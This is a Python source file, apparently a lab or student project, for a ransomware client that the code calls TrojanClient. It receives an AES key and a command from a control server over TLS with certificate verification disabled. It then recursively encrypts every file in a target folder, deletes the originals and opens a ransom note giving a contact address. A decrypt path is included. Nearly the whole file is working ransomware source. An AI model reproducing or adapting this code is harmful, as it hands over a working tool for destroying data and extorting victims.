import socket
import ssl
import os
import sys
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import protocol


class FileEncryptor:
    """מטפל בהצפנה ופיענוח של קבצים בתיקייה"""
    
    @staticmethod
    def encrypt_all(folder_path, aes_key):
        for file_name in os.listdir(folder_path):
            full_path = os.path.join(folder_path, file_name)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, "rb") as f:
                        file_data = f.read()

                    iv = get_random_bytes(16)
                    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))

                    with open(full_path + "_", "wb") as f:
                        f.write(iv + encrypted_data)

                    os.remove(full_path)
                except Exception:
                    continue
            elif os.path.isdir(full_path):
                FileEncryptor.encrypt_all(full_path, aes_key)

    @staticmethod
    def decrypt_all(folder_path, aes_key):
        for file_name in os.listdir(folder_path):
            full_path = os.path.join(folder_path, file_name)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, "rb") as f:
                        file_data = f.read()

                    iv = file_data[:16]
                    encrypted_data = file_data[16:]
                    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

                    decrypted_path = full_path.rstrip("_")
                    with open(decrypted_path, "wb") as f:
                        f.write(decrypted_data)

                    os.remove(full_path)
                except Exception:
                    continue
            elif os.path.isdir(full_path):
                FileEncryptor.decrypt_all(full_path, aes_key)


class RansomNote:
    """אחראית על כתיבת הודעות לרשומת הפענוח או ההצפנה"""
    
    @staticmethod
    def show_encrypted():
        note = """
        🔒 All your files have been encrypted!
        
        To get the key and decrypt your files, contact us.
        Contact: hackers@example.com
        Victim ID: 142739ddd
        """
        with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
            f.write(note)
        os.system("notepad README_DECRYPT.txt")

    @staticmethod
    def show_decrypted():
        note = """
        🔓 All your files have been decrypted!
        Your system is restored and your files are back to normal.
        """
        with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
            f.write(note)
        os.system("notepad README_DECRYPT.txt")


class TrojanClient:
    """מחלקת הלקוח הראשית שאחראית לתקשורת עם השרת"""
    
    def __init__(self, host, port, folder):
        self.host = host
        self.port = port
        self.folder = folder
        self.context = ssl._create_unverified_context()

    def connect(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            with self.context.wrap_socket(s, server_hostname="anything") as secure_sock:
                secure_sock.connect((self.host, self.port))
                print("[+] Connected to server with TLS.")
                self._communicate(secure_sock)

    def _communicate(self, conn):
        aes_key = protocol.receive(conn)
        action = protocol.receive(conn).decode("utf-8")

        if action == "encrypt":
            FileEncryptor.encrypt_all(self.folder, aes_key)
            del aes_key
            RansomNote.show_encrypted()
            protocol.send(conn, "the files are encrypted")

        elif action == "decrypt":
            FileEncryptor.decrypt_all(self.folder, aes_key)
            del aes_key
            RansomNote.show_decrypted()
            protocol.send(conn, "the files are decrypted")

        sys.exit()


if __name__ == "__main__":
    target_folder = "D:\check"
    host = "127.0.0.1"
    port = 44444
    
    client = TrojanClient(host, port, target_folder)
    client.connect()